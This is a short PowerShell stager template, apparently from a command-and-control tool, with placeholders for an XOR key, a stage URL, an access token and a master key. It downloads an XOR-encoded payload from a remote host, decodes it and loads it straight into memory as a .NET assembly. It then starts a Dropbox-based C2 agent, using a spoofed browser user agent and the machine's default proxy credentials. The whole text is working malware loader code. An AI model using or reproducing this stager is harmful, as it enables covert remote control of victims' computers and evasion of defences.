$$wc=New-Object System.Net.WebClient;$$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");$$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
$$k="${xorKey}";$$i=0;[byte[]]$$b=([byte[]]($$wc.DownloadData("${stagePublicURL}")))|%{$$_-bxor$$k[$$i++%$$k.length]}
[System.Reflection.Assembly]::Load($$b) | Out-Null
$$p=@("${accessToken}", "${masterKey}")
[dropboxc2.C2_Agent]::Main($$p)